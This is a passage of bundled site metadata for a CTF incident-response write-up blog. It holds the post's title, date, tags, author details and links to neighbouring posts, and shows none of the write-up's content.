\u9898\u76ee\u5206\u6790","date":"2024-11-09T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":18.89,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024sxb Scenario-Race Data-Backup","title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","authors":"Randark","tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u5f3a\u7f51\u676f Master of DFIR","permalink":"/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR"},"nextItem":{"title":"\u6e17\u900f\u6d4b\u8bd5\u5e38\u7528 poc","permalink":"/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing"}}')}}]);